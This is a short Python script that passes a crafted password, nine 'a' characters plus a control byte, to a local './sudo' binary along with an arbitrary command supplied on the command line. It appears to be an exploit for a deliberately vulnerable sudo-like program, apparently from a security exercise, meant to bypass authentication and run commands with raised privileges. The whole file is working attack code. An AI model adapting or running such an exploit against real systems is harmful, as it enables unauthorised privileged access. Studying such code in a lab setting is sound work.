import os, sys
import subprocess

PATH_TO_SUDO = './sudo'


def run_command(cmd):
    a=''.join(chr(1))
    password=[]
    b = "aaaaaaaaa"
    password.append(b)
    password.append(a)
    passwordReal=''.join(password) 
    subprocess.call( [PATH_TO_SUDO, passwordReal, cmd])

def main(argv):
    if not len(argv) == 2:
        print 'Usage: %s <command>' % argv[0]
        sys.exit(1)

    cmd = argv[1]
    run_command(cmd)


if __name__ == '__main__':
    main(sys.argv)
